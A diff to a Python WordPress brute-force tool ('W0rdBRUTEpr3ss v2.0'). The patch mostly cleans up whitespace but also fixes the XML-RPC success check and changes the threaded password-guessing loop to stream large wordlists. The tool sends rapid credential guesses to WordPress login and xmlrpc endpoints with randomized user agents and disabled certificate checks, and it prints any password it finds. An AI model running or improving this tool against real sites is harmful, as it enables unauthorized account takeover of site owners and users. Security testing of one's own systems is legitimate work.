@@ -3,7 +3,7 @@
 # WordPress Brute Force by Claudio Viviani
 #
 # Inspired by xSecurity's WordPress Brute Muliththreading
-# 
+#
 # Tested on Wordpress 3.x and 4.x
 #
 # Disclaimer:
@@ -27,11 +27,11 @@
 #
 # CHANGELOG:
 #
-#  2015-04-12 v2.0 
+#  2015-04-12 v2.0
 #  1) Add new feature xml-rpc brute force mode
 #  2) Fix minor bugs
 #
-#  2015-04-11 v1.1 
+#  2015-04-11 v1.1
 #  1) optparse (Deprecated since version 2.7) replaced by argparse
 #  2) Fix connection bugs
 #
@@ -43,20 +43,20 @@ from threading import Thread
 from time import sleep
 
 banner = """
-  ___ ___               __                                          
- |   Y   .-----.----.--|  .-----.----.-----.-----.-----.            
- |.  |   |  _  |   _|  _  |  _  |   _|  -__|__ --|__ --|            
- |. / \  |_____|__| |_____|   __|__| |_____|_____|_____|            
- |:      |                |__|                                      
- |::.|:. |                                                          
- `--- ---'                                                          
-        _______            __         _______                       
+  ___ ___               __
+ |   Y   .-----.----.--|  .-----.----.-----.-----.-----.
+ |.  |   |  _  |   _|  _  |  _  |   _|  -__|__ --|__ --|
+ |. / \  |_____|__| |_____|   __|__| |_____|_____|_____|
+ |:      |                |__|
+ |::.|:. |
+ `--- ---'
+        _______            __         _______
        |   _   .----.--.--|  |_.-----|   _   .-----.----.----.-----.
        |.  1   |   _|  |  |   _|  -__|.  1___|  _  |   _|  __|  -__|
        |.  _   |__| |_____|____|_____|.  __) |_____|__| |____|_____|
-       |:  1    \                    |:  |                          
-       |::.. .  /                    |::.|                          
-       `-------'                     `---'                          
+       |:  1    \                    |:  |
+       |::.. .  /                    |::.|
+       `-------'                     `---'
 
                                         W0rdBRUTEpr3ss v2.0
 
@@ -70,7 +70,7 @@ banner = """
                    homelabit@protonmail.ch
 
         http://ffhd.homelab.it (Free Fuzzy Hashes Database)
-               http://archive-exploit.homelab.it/1 
+               http://archive-exploit.homelab.it/1
                https://www.facebook.com/homelabit
                  https://twitter.com/homelabit
                https://plus.google.com/+HomelabIt1/
@@ -205,8 +205,8 @@ def connection(url,user,password,UA,timeout,brutemode):
     pwd = password
 
     http = httplib2.Http(timeout=timeout, disable_ssl_certificate_validation=True)
-    
-    # HTTP POST Data 
+
+    # HTTP POST Data
     body = bodyCMS(username,pwd,brutemode)
 
     # Headers
@@ -225,9 +225,9 @@ def connection(url,user,password,UA,timeout,brutemode):
               print('\n')
               print('[!] Password FOUND!!!')
               print('')
-              print('[!] Username: '+user+' Password: '+password) 
+              print('[!] Username: '+user+' Password: '+password)
               os._exit(0)
-        
+
            checkCon = "OK"
            return checkCon
         else:
@@ -239,8 +239,8 @@ def connection(url,user,password,UA,timeout,brutemode):
 
            # Remove all blank and newline chars
            xmlcontent = content.replace(" ", "").replace("\n","")
-           
-           if not "403" in xmlcontent:
+
+           if not "faultCode" in xmlcontent:
               print('\n')
               print('[!] Password FOUND!!!')
               print('')
@@ -249,7 +249,7 @@ def connection(url,user,password,UA,timeout,brutemode):
 
            checkCon = "OK"
            return checkCon
-              
+
     except socket.timeout:
          print('[X] Connection Timeout')
          os._exit(1)
@@ -265,6 +265,13 @@ def connection(url,user,password,UA,timeout,brutemode):
     except httplib2.HttpLib2Error:
         print('[X] Connection Error!!')
         os._exit(1)
+
+
+def blocks(files, size=65536):
+    while True:
+        b = files.read(size)
+        if not b: break
+        yield b
 
 commandList = argparse.ArgumentParser(sys.argv[0])
 commandList.add_argument('-S', '--standard',
@@ -328,25 +335,25 @@ else:
 # args to vars
 url = options.target
 user = options.username
-password = options.wordfilelist
+wlfile = options.wordfilelist
 timeout = options.timeout
 
-
 # Check if Wordlist file exists and has readable
-if not os.path.isfile(password) and not os.access(password, os.R_OK):
+if not os.path.isfile(wlfile) and not os.access(wlfile, os.R_OK):
     print "[X] Wordlist file is missing or is not readable"
     sys.exit(1)
 
-# Open and read Wordlist file
-wordlist = open(password).read().split("\n")
-# Remove last empty values from wordlist list
-del wordlist[-1]
-# Total lines (password) in Wordlist file
-totalwordlist = len(wordlist)
 # Gen Random UserAgent
 UA  = randomAgentGen()
 # Url to url+login_cms_page
 url = urlCMS(url,brtmd)
+
+wlsize = os.path.getsize(wlfile) >>20
+if wlsize < 100:
+    with open(wlfile) as f:
+        totalwordlist = sum(bl.count("\n") for bl in blocks(f))
+else:
+    totalwordlist="unknown"
 
 print(banner)
 print
@@ -369,15 +376,17 @@ if connection(url,user,UA,UA,timeout,brtmd) == "OK":
 count = 0
 
 threads = []
-for pwd in wordlist:
-    count += 1
-    t = Thread(target=connection, args=(url,user,pwd,UA,timeout,brtmd))
-    t.start()
-    threads.append(t)
-    sys.stdout.write('\r')
-    sys.stdout.write('[+] Password checked: '+str(count)+'/'+str(totalwordlist))
-    sys.stdout.flush()
-    sleep(0.210)
+
+with open(wlfile) as wordlist:
+	for pwd in wordlist:
+	    count += 1
+	    t = Thread(target=connection, args=(url,user,pwd,UA,timeout,brtmd))
+	    t.start()
+	    threads.append(t)
+	    sys.stdout.write('\r')
+	    sys.stdout.write('[+] Password checked: '+str(count)+'/'+str(totalwordlist))
+	    sys.stdout.flush()
+	    sleep(0.210)
 
 for a in threads:
     a.join()
